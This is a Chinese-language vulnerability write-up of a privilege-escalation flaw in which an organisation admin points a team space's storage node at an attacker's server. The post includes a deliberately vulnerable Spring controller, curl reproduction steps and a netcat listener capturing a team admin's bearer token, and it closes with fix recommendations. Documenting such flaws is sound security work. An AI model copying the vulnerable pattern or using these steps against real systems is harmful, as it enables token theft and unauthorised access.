## 漏洞描述
应用中存在组织管理员和团队管理员，组织管理员独立于团队空间可以设置团队空间的存储节点地址。当创建一个团队空间时，需要组织管理员审批，团队管理员可以选择将组织管理员加入到团队，其在团队空间的文件操作权限由团队管理员设置。也就是说尽管组织管理员可以管理组织内的各个团队，但是其在团队空间内的权限是小于团队管理员的。组织管理员和团队管理员在不同域内存在垂直和水平上的权限区别，即**权限维度交叉**。
由于组织管理员可以设置整个组织的存储节点地址为任意地址，所以当设置为一个恶意服务器时，可以监听团队空间成员操作文件的请求，可以劫持响应流返回非预期的文件内容，甚至直接从请求中提取凭证，进而获取其在该团队空间的权限。

该漏洞的核心成因在于**跨安全域的权限边界混淆与特权滥用**：
1. **权限维度交叉**：组织管理员在“组织维度”拥有修改存储节点的高权限，但在“团队维度”只是普通成员。系统允许组织管理员修改所属组织的存储节点，却没有评估该节点是否被其他更高安全要求的团队空间所依赖。
2. **动态配置劫持**：存储节点地址作为系统的核心基础设施配置，不应允许低安全级别的角色（相对于全局系统而言）进行随意更改，更未对更改的地址进行白名单校验。
3. **信任链传递断裂**：团队管理员和团队成员信任了平台分配的存储节点，但由于节点地址被恶意篡改，导致整个团队空间的数据流向被劫持，引发中间人攻击（MITM）。最终通过截获 凭证，完成了从“普通团队成员”到“团队管理员”的垂直越权。

## 漏洞复现
我将以以下顺序复现：
```
组织管理员删除团队成员（预期失败）-->
组织管理员修改存储节点地址(预期成功）-->

组织管理员用监听的凭证请求删除团队成员的接口（预期成功）
```

### 核心控制器 (漏洞爆发点)

接口情况：
```
/api/auth/org-admin/login # 组织管理员登录接口，获取组织管理员凭证
/api/auth/team-admin/login # 团队管理员登录接口，获取团队管理员凭证
/api/org/storage/view # 查看存储节点地址，仅组织管理员可查看
/api/org/storage/update # 修改存储地址节点地址，仅组织管理员可修改
/api/team/file/download # 模拟下载团队空间的文件
/api/team/admin/delete-member # 移除团队成员
```

```java
package com.example.demo.Controller;

import com.example.demo.entity.MockDatabase;
import org.springframework.http.HttpStatus;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.time.Duration;
import java.util.HashMap;
import java.util.Map;
import java.util.Set;

@RestController
@RequestMapping("/api")
public class VulnerableController {

    @PostMapping("/auth/org-admin/login")
    public ResponseEntity<String> loginOrgAdmin(@RequestParam String userId) {
        if (!"ROLE_ORG_ADMIN".equals(MockDatabase.users.get(userId))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("403 Forbidden: 仅组织管理员可登录");
        }
        return ResponseEntity.ok(MockDatabase.userTokens.get(userId));
    }

    @PostMapping("/auth/team-admin/login")
    public ResponseEntity<String> loginTeamAdmin(@RequestParam String userId) {
        if (!"ROLE_TEAM_ADMIN".equals(MockDatabase.users.get(userId))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("403 Forbidden: 仅团队管理员可登录");
        }
        return ResponseEntity.ok(MockDatabase.userTokens.get(userId));
    }

    @GetMapping("/org/storage/view")
    public ResponseEntity<String> viewOrgStorage(@RequestHeader(value = "Authorization", required = false) String authorization) {
        String userId = resolveUserId(authorization);
        if (userId == null || !"ROLE_ORG_ADMIN".equals(MockDatabase.users.get(userId))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("403 Forbidden: 仅组织管理员可查看存储节点地址");
        }

        String orgId = MockDatabase.userOrgMapping.get(userId);
        return ResponseEntity.ok(MockDatabase.orgStorageConfig.get(orgId));
    }

    @PostMapping("/org/storage/update")
    public ResponseEntity<String> updateOrgStorage(@RequestHeader(value = "Authorization", required = false) String authorization,
                                                   @RequestParam String newStorageUrl) {
        String userId = resolveUserId(authorization);
        if (userId == null || !"ROLE_ORG_ADMIN".equals(MockDatabase.users.get(userId))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("403 Forbidden: 需要组织管理员权限");
        }

        String orgId = MockDatabase.userOrgMapping.get(userId);
        MockDatabase.orgStorageConfig.put(orgId, newStorageUrl);
        return ResponseEntity.ok("存储节点已更新为: " + newStorageUrl);
    }

    @GetMapping("/team/file/download")
    public ResponseEntity<Map<String, String>> downloadFile(@RequestHeader(value = "Authorization", required = false) String authorization,
                                                            @RequestParam String teamId) {
        Map<String, String> response = new HashMap<>();
        String userId = resolveUserId(authorization);
        if (userId == null) {
            response.put("error", "401 Unauthorized: 缺少或无效的 Authorization Token");
            return ResponseEntity.status(HttpStatus.UNAUTHORIZED).body(response);
        }

        String role = MockDatabase.users.get(userId);
        if ("ROLE_ORG_ADMIN".equals(role)) {
            response.put("error", "403 Forbidden: 组织管理员不能操作团队空间文件");
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body(response);
        }

        Set<String> members = MockDatabase.teamMembers.get(teamId);
        if (members == null || !members.contains(userId)) {
            response.put("error", "403 Forbidden: 不在团队空间内");
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body(response);
        }

        String orgId = MockDatabase.teamOrgMapping.get(teamId);
        String storageUrl = MockDatabase.orgStorageConfig.get(orgId);
        String downloadUrl = storageUrl + "/files/download?fileId=123";

        try {
            HttpClient client = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(5))
                    .build();

            HttpRequest request = HttpRequest.newBuilder()
                    .uri(URI.create(downloadUrl))
                    .timeout(Duration.ofSeconds(5))
                    .header("Authorization", "Bearer " + MockDatabase.userTokens.get(userId))
                    .GET()
                    .build();

            HttpResponse<String> storageResponse = client.send(request, HttpResponse.BodyHandlers.ofString());
            response.put("downloadUrl", downloadUrl);
            response.put("storageStatus", String.valueOf(storageResponse.statusCode()));
            response.put("storageResponse", storageResponse.body());
            return ResponseEntity.ok(response);
        } catch (IOException | InterruptedException e) {
            Thread.currentThread().interrupt();
            response.put("error", "500 Internal Server Error: 访问存储节点失败");
            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(response);
        }
    }

    @DeleteMapping("/team/admin/delete-member")
    public ResponseEntity<String> deleteMember(@RequestHeader(value = "Authorization", required = false) String authorization,
                                               @RequestParam String targetUserId) {
        String userId = resolveUserId(authorization);
        if (userId == null || !"ROLE_TEAM_ADMIN".equals(MockDatabase.users.get(userId))) {
            return ResponseEntity.status(HttpStatus.FORBIDDEN).body("403 Forbidden: 仅团队管理员可操作");
        }
        return ResponseEntity.ok("成功从团队移除成员: " + targetUserId);
    }

    private String resolveUserId(String authorization) {
        if (authorization == null || !authorization.startsWith("Bearer ")) {
            return null;
        }
        String token = authorization.substring("Bearer ".length()).trim();
        return MockDatabase.tokenToUserId.get(token);
    }
}
```


### 漏洞利用演示逻辑
**前提背景**：

- `org_admin` (组织管理员) 被 `team_admin` (团队管理员) 拉入了 `team_1` 团队空间。
- `team_1` 属于 `org_1`，初始存储节点为 `http://safe-storage.com`。

**攻击步骤复现**：

**第一步：组织管理员尝试删除团队成员**
组织管理员`org_admin` 没有权限删除团队成员
```bash
# 1。 先获取凭证
curl -X POST "http://127.0.0.1:8080/api/auth/org-admin/login?userId=org_admin"
# （输出）ORG_ADMIN_TOKEN_123
# 2. 删除团队成员
curl -X DELETE "http://127.0.0.1:8080/api/team/admin/delete-member?targetUserId=10001" -H "Authorization: Bearer ORG_ADMIN_TOKEN_123"
# （输出）403 Forbidden: 仅团队管理员可操作
```

**第二步：组织管理员篡改存储节点**
组织管理员 `org_admin` 利用自身的组织权限，将存储节点改为攻击者控制的恶意服务器。
```bash
# 1. 查看原来的存储节点地址
curl -X GET "http://127.0.0.1:8080/api/org/storage/view" -H "Authorization: Bearer ORG_ADMIN_TOKEN_123"
# （输出）http://safe-storage.com
# 2. 修改存储节点地址
curl -X POST "http://127.0.0.1:8080/api/org/storage/update" -H "Authorization: Bearer ORG_ADMIN_TOKEN_123" -H "Content-type: application/x-www-form-urlencoded" --data newStorageUrl=http://172.31.114.167:9000
# （输出）存储节点已更新为: http://172.31.114.167:9000
```

**第三步：团队成员（包括团队管理员）请求下载文件**
团队管理员 `team_admin` 在团队空间内点击下载文件，业务服务端对存储节点地址进行请求（这里还有SSRF漏洞），并带上了用于鉴权的明文 Token。

```bash
curl "http://127.0.0.1:8080/api/team/file/download?teamId=team_1" -H "Authorization: Bearer TEAM_ADMIN_SUPER_TOKEN_888"
# （输出）{"error":"500 Internal Server Error: 访问存储节点失败"}
```

恶意服务器监听窃取凭证`TEAM_ADMIN_SUPER_TOKEN_888`，用于后续利用
```bash
$ nc -lvnp 9000
Listening on 0.0.0.0 9000
Connection received on 172.31.112.1 59361
GET /files/download?fileId=123 HTTP/1.1
Connection: Upgrade, HTTP2-Settings
Content-Length: 0
Host: 172.31.114.167:9000
HTTP2-Settings: AAEAAEAAAAIAAAAAAAMAAAAAAAQBAAAAAAUAAEAAAAYABgAA
Upgrade: h2c
User-Agent: Java-http-client/17.0.17
Authorization: Bearer TEAM_ADMIN_SUPER_TOKEN_888
```

**第四步：组织管理员利用窃取凭证尝试删除团队成员**
```bash
curl -X DELETE "http://127.0.0.1:8080/api/team/admin/delete-member?targetUserId=10001" -H "Authorization: Bearer TEAM_ADMIN_SUPER_TOKEN_888"
# （输出）成功从团队移除成员: 10001
```


## 安全修复建议

结合参考资料中关于“统一校验与业务使用的数据源”、“杜绝客户端参与鉴权”的安全理念，修复建议如下：

1. **权限收归与配置白名单（基础防御）**： 存储节点地址属于底层基础设施配置，修改权限应收归至全局系统管理员或运维平台。如果业务确实需要机构管理员自定义存储，必须强制校验新地址是否在平台允许的可信白名单域名/IP池内，杜绝任意地址下发。除了白名单，也可以通过公私钥验签的方式确保组织管理员不能随便部署一个假的存储节点，平台保存所有节点公钥，存储节点则保存各自的私钥。
2. **身份与会话隔离（核心防御）**： 客户端直接携带 Token 访问存储节点是导致 Token 被轻易劫持的根因。应当采用服务端代理转发或下发短期临时凭证（如 STS 临时访问令牌）的架构。团队管理员上传/下载文件时，由业务服务端鉴权后生成仅限于特定文件操作且有效期极短的临时 Token，即使被恶意服务器截获，过期后也无法用于获取团队空间的完整管理权限。
3. **环境隔离**： 不同安全级别的空间（如机构公共空间与核心团队空间）应强制使用物理或逻辑隔离的存储桶/节点，避免低权限角色的配置变更产生跨域影响。


## 小结
这个 Demo 与普通越权的区别：普通的越权通常是“我伪造身份去访问你的接口”，而这个案例是“**我利用自身合法的低阶权限，改变了系统的底层依赖环境（存储配置），逼迫高权限用户在不知情的情况下，主动将高权限凭证送入我的陷阱**”，属于信任链和架构缺陷的漏洞。
其实在进行修复的时候还是存在一些争议，有的是认为漏洞的根源就是设置了不合法的存储节点地址，而组织管理员本身就能更改存储节点地址，所以只需要二次审核就行，确保组织管理员A的设置可以被组织管理员B审核，避免权限的滥用。这种方式是合理的，但我更认同修复方案1和2，一个是有权限设置，但也要确保设置的地址是合法的，而且存储节点不应该频繁变动，所以就应该维护一个白名单，而会话隔离也是应该的，业务和存储本就不是同一个活动，应该使用不同的身份。
值得说一句，这个漏洞是AI发现的，但是它报的是SSRF，这也没错，但是我认为它还存在越权，就试了一下。越来越觉得AI在代码审计上无敌了，当然模型不能太差，好的模型可以省去好多的流程设计。
